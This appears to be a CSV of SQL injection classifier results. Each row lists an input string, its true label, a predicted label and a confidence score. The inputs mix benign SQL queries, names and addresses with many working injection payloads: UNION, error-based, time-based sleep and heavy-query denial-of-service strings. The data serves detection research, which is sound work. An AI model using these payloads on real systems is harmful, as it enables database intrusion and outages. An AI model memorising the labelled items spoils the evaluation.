text,true_label,predicted_label,confidence_sql_injection
"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1.0
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1,1,1.0
s!oap,0,1,0.99
sappington-espana@fighting-machines.mq,0,0,0.006527024015406931
"1%""   )    )    and 4595  =  4595#",1,1,1.0
1'   )    )    as wdor where 7426  =  7426,1,1,1.0
persaud,0,0,0.004468253314358248
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq",1,1,1.0
select count ( married ) from tall,0,0,0.0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'qvyq' like 'qvyq",1,1,1.0
select * from same where    not simply = 'south',0,0,0.0
"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"calle doctor bove, 65",0,0,0.0
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",1,1,1.0
select asin ( 0.25 ) ;,0,0,0.02
delete from satellites,0,0,0.0
select top 3 * from spin where below = 'form' select * from origin,0,0,0.0
oseja,0,0,0.004468253314358248
"   select suddenly, tropical, voyagefrom door where tales  is not null",0,0,0.0
mara beln,0,0,0.004468253314358248
select * from pain where stay between '1996-07-01' and '1996-07-31',0,0,0.0
or,1,1,0.6109987990942388
select avg ( though ) from making select sum ( cowboy ) ,0,0,0.0
96399738e,0,0,0.004468253314358248
gwillim.somerset@mystyleperfume.nl,0,0,0.004468253314358248
t!74ador,0,0,0.15375804839569454
select top 3 * from hill where there = 'torn',0,0,0.0
select * from six where not community = 'famous'  and not luck = 'engine',0,0,0.0
5.25502e+15,0,0,0.0
"plza. leire, 1, 6?a",0,0,0.1700595238095238
"   select count ( order ) , other from pipe by sometime",0,0,0.0
select avg ( price ) from sail,0,0,0.0
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1,1,1.0
"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select * from proud 3,0,0,0.0
select * from higher order by make desc,0,0,0.0
1  )   waitfor delay '0:0:5' and   (  2993  =  2993,1,1,0.99
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'sqni' like 'sqni",1,1,1.0
leyton@intg.tk,0,0,0.004468253314358248
select * from cold where fireplace = 'bread',0,0,0.0
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",1,1,1.0
entrala,0,0,0.004468253314358248
beterette estruga,0,0,0.004468253314358248
arrestar,0,0,0.004468253314358248
"-4586 union all select 2068,2068,2068,2068--",1,1,1.0
"1 union all select null,null,null,null,null--",1,1,1.0
"-7142'   )    )    union all select 5083,5083,5083,5083#",1,1,1.0
kouraviev@socimi.com.gl,0,0,0.0
"calle plantio, 178,",0,0,0.0
6egas0a,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",1,1,0.98
select unhappy from baby union select kill from cake order by arrow,0,0,0.0
paolo,0,0,0.004468253314358248
from  ( select distinct way from area ) ,0,0,0.0
select * from nothing where quick not like '[share]%',0,0,0.0
1' where 9242  =  9242,1,1,1.0
"-2605%'   )    )     )   union all select 4738,4738#",1,1,1.0
afoscarse,0,0,0.004468253314358248
select thou ( s from together right join,0,0,0.0
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1,1,1.0
"select extract ( year_month from ""2017-06-15 09:34:21"" ) ;",0,0,0.0
select * from spend where search between '1996-07-01' and '1996-07-31',0,0,0.0
3.37557e+15,0,0,0.0
select alike ( s )  from soil select vapor ( s ) ,0,0,0.0
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",1,1,1.0
"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",1,1,1.0
end and    (    (     (  'xzbk'  =  'xzbk,1,1,1.0
select count ( certain ) from factory,0,0,0.0
"  select maketime ( 11, 35,   4 ) ;",0,0,0.0
"  select orders.memoryrid, employees.slightly, employees.rain from ordersright join employees on orders.employeeid  =  employees.westernid order by orders.medicineid",0,0,0.0
1'+  (  select 'stdl' where 4581  =  4581,1,1,1.0
raixa s/n,0,0,0.0
select * from customers; delete from customers  where customername = 'alfreds futterkiste';,0,0,0.01
"omellons, els",0,0,0.004468253314358248
"   select count ( uncle ) , day from family by instant",0,0,0.0
"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",1,1,1.0
32893899n,0,0,0.004468253314358248
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1,1,1.0
29850288z,0,0,0.004468253314358248
"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"  select * from bone where ever not in  ( 'planning', 'watch', 'label' )  ",0,0,0.0
1' where 6583  =  6583,1,1,1.0
"plaza de el salvador 91,",0,0,0.0
select * from users where userid  =  105; drop table suppliers;,0,0,0.17
select * from deal order by adventure,0,0,0.0
"1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '",1,1,1.0
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",1,1,1.0
select * from exercise where raise = 'fact'  or start = 'slip',0,0,0.0
8.61689e+15,0,0,0.0
select min ( doubt )  as horn from work,0,0,0.0
"1' in boolean mode  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",1,1,1.0
 update riding set piano = 'perfectly'where peace = 'such',0,0,0.0
14724400f,0,0,0.004468253314358248
acrianzada,0,0,0.004468253314358248
select * from negative where poor = 'third' limit 3,0,0,0.0
"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"  select orders.fifteenrid, employees.attempt, employees.date from ordersright join employees on orders.employeeid  =  employees.forestid order by orders.anywayid",0,0,0.0
-9087 or 3038  =  3038,1,1,0.98
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1,1,1.0
select 10 div 5;,0,0,0.06
select * from wheel,0,0,0.0
select * from although 3 select * from frozen,0,0,0.0
select * from individual where    not post = 'horn',0,0,0.0
23,0,0,0.004468253314358248
1'||  (  select 'zeet' from dual where 9567  =  9567 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,0.98
-3677'   )    )    or 1939  =  4484,1,1,1.0
"   select zulu, wise, poor from poor where with  is null",0,0,0.0
1' and 1541  =  6868#,1,1,1.0
select fought ( s )  from planned,0,0,0.0
crabe,0,0,0.004468253314358248
37766,0,0,0.004468253314358248
1  )   as hggi where 6511  =  6511,1,1,1.0
"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1,1,1.0
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
"1""   )    )    as bbkl where 5686  =  5686",1,1,1.0
select waste ( s )  from direct select putting ( s ) ,0,0,0.0
"   select swim, again, thrown from diameter where driver  is null",0,0,0.0
select * from citizen where explanation = 'office' limit 3,0,0,0.0
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',1,1,0.99
"1""  )   as iwri where 4921  =  4921 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,1,1.0
"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",1,1,1.0
"1'+  (  select sfmz where 4870  =  4870 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
" select o.orderid, o.orderdate, c.customername from customers as c, orders as o where c.customername = 'around the horn' and c.customerid = o.customerid;",0,0,0.05
select wp_posts.* from wp_posts where id in  ( 367582 ) ,0,0,0.0
order by,1,0,0.16023803881204057
select * from captured where    not feathers = 'mountain',0,0,0.0
select * from slip where husband = 'free'  or alive = 'did',0,0,0.0
"1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1,1,1.0
"1'  )   where 7322  =  7322 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
robin,0,0,0.004468253314358248
select * from slept,0,0,0.0
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,1.0
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,1.0
select count ( adultid ) from visitor,0,0,0.0
"1%'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '%'  =  '",1,1,1.0
select * from came where green = 'quickly'  or matter = 'deal',0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",1,1,1.0
"-9178 where 2253  =  2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",1,1,1.0
"-9111"" or 3038  =  3038",1,1,1.0
select * from final  where salmon not like '[ship]%',0,0,0.0
select top 3 * from support,0,0,0.0
azema.alvir@telogis.gf,0,0,0.004468253314358248
select count ( * )  as sugar,0,0,0.0
 -- &password  = ,1,1,0.97
28760,0,0,0.004468253314358248
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",1,1,1.0
select cat from women,0,0,0.0
select avg ( courage ) from daughter,0,0,0.0
select top 50 percent * from college select * from memory fetch first 50 percent rows onlyselect top 3 * from rising,0,0,0.0
"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,1,1,1.0
select * from without where car = 'especially'  or tears = 'southern',0,0,0.0
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",1,1,1.0
-2181'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'wyez'  =  'wyez,1,1,1.0
 update doing set die = 'damage'where harbor = 'heat',0,0,0.0
"   select perfectly,fear,rhythm,sharp,handsome     (  (  forgot join type on broke.greatly =  older.pack )   inner join buffaloon orders.prize =  enough.courtid ) ",0,0,0.0
select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,1,1,1.0
"-6108'  )   union all select 2519,2519,2519,2519--",1,1,1.0
select * from driver,0,0,0.0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,1,1.0
"1"" where 8333  =  8333",1,1,1.0
"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",1,1,1.0
8230,0,0,0.004468253314358248
"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,1,1,1.0
union select,1,1,0.7006308761792265
select * from breeze where accept = 'pet'  or out = 'gave',0,0,0.0
select avg ( well ) from drop select sum ( statement ) ,0,0,0.0
"1%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%""  =  """,1,1,1.0
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1.0
d76en3r9n8z01,0,0,0.004468253314358248
select * from forgot where either not like '[lion]%',0,0,0.0
"   select tip, half, drivingfrom physical where usual  is not null",0,0,0.0
chaddie,0,0,0.004468253314358248
1%'  )   or sleep  (  5  )  #,1,1,1.0
"1   )    )    union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
1' where 2958  =  2958,1,1,1.0
"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1,1,1.0
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1,1,1.0
select avg ( milk ) from than,0,0,0.0
select * from cup where care between '1996-07-01' and '1996-07-31',0,0,0.0
alcoholado sabaters,0,0,0.004468253314358248
"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
1139,0,0,0.004468253314358248
raimondo,0,0,0.004468253314358248
select top 3 * from hello,0,0,0.0
select * from liquid order by pond,0,0,0.0
